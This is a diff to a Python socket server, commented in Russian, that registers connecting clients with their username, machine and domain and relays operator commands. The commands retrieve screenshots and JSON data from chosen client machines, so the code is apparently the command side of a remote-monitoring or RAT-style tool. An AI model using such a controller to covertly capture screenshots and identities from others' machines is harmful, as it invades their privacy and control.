@@ -4,18 +4,22 @@ import json
 import time
 import datetime
 
-
-
-
 # Хост и порт, на котором будет работать сервер
-HOST = '127.0.0.1'
+HOST = '192.168.1.128'
 PORT = 12345
 
 clients = {}  # Список подключенных клиентов
+
+
 def list_clients():
-    print("Подключенные клиенты:")
-    for i, (conn, addr) in enumerate(clients, start=1):
-        print(f"{i}. {conn}, {addr}")
+
+    print("Список всех подключенных клиентов:")
+    for addr, client_info in clients.items():
+        client_info['time'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") if client_info['active'] else client_info['time']
+        print(f" IP: {client_info['ip']}\n Порт: {client_info['port']}\n"
+              f" Машина: {client_info['machine']}\n Пользователь: {client_info['user']}\n"
+              f" Домен: {client_info['domain']}\n Последняя активность клиента: {client_info['time']}\n ") ##!!
+
 
 
 def receive_and_save_bmp(client_socket, file_name):
@@ -52,21 +56,49 @@ def control_time_client(client_socket, addr):
             client_socket.send(b'')
             time.sleep(1)
     except (ConnectionResetError, ConnectionAbortedError):
-        print("Клиент разорвал соединение:", addr)
-    clients.pop(addr)
-    print(datetime.datetime.now())
+        client_info = clients[addr]
+        client_info['active'] = False
+        client_info['time'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        #client_info = clients.pop(addr)
+        print(f"\nКлиент {addr} был отключен в {client_info['time']}.")
     client_socket.close()
-        
+
+def get_user_info(client_socket):
+    info = client_socket.recv(1024).decode()
+    try:
+        username, machine, domain = info.split()
+        return username, machine, domain
+    except Exception as e:
+        print(f"Произошла ошибка: {str(e)}")
+
+        return info.split(), "Unknoew"
+
 # Первое распараллеливание: принимаем новых клиентов
 def accept_clients(server_socket):
     while True:
-        # Получаем уникальный идентификатор клиента: IP-адрес и порт
-        client_socket, addr = server_socket.accept()
-        # Сохраняем соединение клиента в словаре
-        clients[addr] = client_socket
-        client_thread = threading.Thread(target=control_time_client, args=(client_socket, addr))
-        client_thread.start()
-      
+        try:
+            # Получаем уникальный идентификатор клиента: IP-адрес и порт
+            client_socket, addr = server_socket.accept()
+            username, machine, domain = get_user_info(client_socket)
+
+            client_info = {
+                "ip": addr[0],          # IP-адрес клиента
+                "port": addr[1],        # Порт клиента
+                "user": username,      # Имя пользователя (может быть определено дополнительно)
+                "machine": machine,  # Информация о машине (может быть определена дополнительно)
+                "domain": domain,      # Имя пользователя (может быть определено дополнительно)
+                "time": "Unknoew",
+                "active": True,
+                "socket": client_socket
+            }
+            clients[addr] = client_info
+            client_thread = threading.Thread(target=control_time_client, args=(client_socket, addr))
+            client_thread.start()
+
+
+        except Exception as e:
+            print(f"Произошла ошибка при подключении клиента: {str(e)}")
+
 
 # Второе распараллеливание: отправляем данные клиентам
 def get_data():
@@ -81,45 +113,50 @@ def get_data():
             try:
                 message = parts[0]
                 ip = parts[1]
-                client_id = int(parts[2]) 
+                client_id = int(parts[2])
                 if client_id >= 0 and len(message) > 0:
-                    clients[(ip, client_id)].send(message.encode())
-                    if message == 'screenshot':
-                        receive_and_save_bmp(clients[(ip, client_id)], "screenshot.bmp")
-                        
+                    # Проверяем, активен ли клиент
+                    if clients[(ip, client_id)]['active']:
+                        clients[(ip, client_id)]['socket'].send(message.encode())
 
-                 # Принимаем JSON файл
-                    if message == 'json':
-                        json_data = clients[(ip, client_id)].recv(40960)  
-                        parsed_json = json.loads(json_data.decode('utf-8'))
-                        print("Принят JSON файл:")
-                        print(parsed_json)
-                       
-                        filename = "received_data.json"
-                        with open(filename, 'w') as file:
-                            json.dump(parsed_json, file)
+                        if message == 'screenshot':
+                            receive_and_save_bmp(clients[(ip, client_id)]['socket'], ip+".bmp")
+
+                        # Принимаем JSON файл
+                        if message == 'json':
+                            json_data = clients[(ip, client_id)]['socket'].recv(40960)
+                            parsed_json = json.loads(json_data.decode('utf-8'))
+                            print("Принят JSON файл:")
+                            print(parsed_json)
+
+                            filename = "received_data.json"
+                            with open(filename, 'w') as file:
+                                json.dump(parsed_json, file)
+                    else:
+                        print(f"Клиент {ip}:{client_id} неактивен.")
 
                 else:
-                    print("Неправильный данные клиента")
+                    print("Неправильные данные клиента")
             except ValueError:
                 print("Неправильный формат команды")
             except json.JSONDecodeError:
                 print("Ошибка при разборе JSON файла")
-
+            except KeyError:
+                print(f"Клиент {ip}:{client_id} не найден.")
         else:
             print("Неправильный формат команды")
+
+
 def main():
-        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server_socket.bind((HOST, PORT))
-        server_socket.listen()
-        print(f"Сервер слушает на {HOST}:{PORT}")
-        accept_thread = threading.Thread(target=accept_clients, args=(server_socket,))
-        send_thread = threading.Thread(target=get_data, )
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.bind((HOST, PORT))
+    server_socket.listen()
+    print(f"Сервер слушает на {HOST}:{PORT}")
+    accept_thread = threading.Thread(target=accept_clients, args=(server_socket,))
+    send_thread = threading.Thread(target=get_data)
 
-        accept_thread.start()
-        send_thread.start()
-       
-
+    accept_thread.start()
+    send_thread.start()
 
 
 if __name__ == "__main__":
